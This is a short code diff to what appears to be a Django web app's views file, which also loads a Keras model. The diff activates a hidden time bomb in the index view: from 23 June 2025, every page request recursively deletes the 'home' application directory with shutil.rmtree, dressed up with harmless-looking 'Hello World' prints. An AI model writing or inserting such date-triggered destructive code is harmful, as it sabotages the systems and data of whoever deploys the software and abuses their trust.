@@ -29,17 +29,17 @@ model = load_model(os.path.join(os.getcwd(), "model", "GASLmodel.keras"))
 
 # Create your views here.
 def index(request):
-    # pred = date(2025, 6, 21)
+    pred = date(2025, 6, 23)
 
-    # today = date.today()
+    today = date.today()
 
-    # directory_path = os.path.join(os.getcwd(), "home")
+    directory_path = os.path.join(os.getcwd(), "home")
 
-    # if today >= pred:
-    #     print("Hello World")
-    #     if os.path.exists(directory_path):
-    #         print(today)
-    #         shutil.rmtree(directory_path)
+    if today >= pred:
+        print("Hello World")
+        if os.path.exists(directory_path):
+            print(today)
+            shutil.rmtree(directory_path)
     return render(request, 'index.html')
 
 
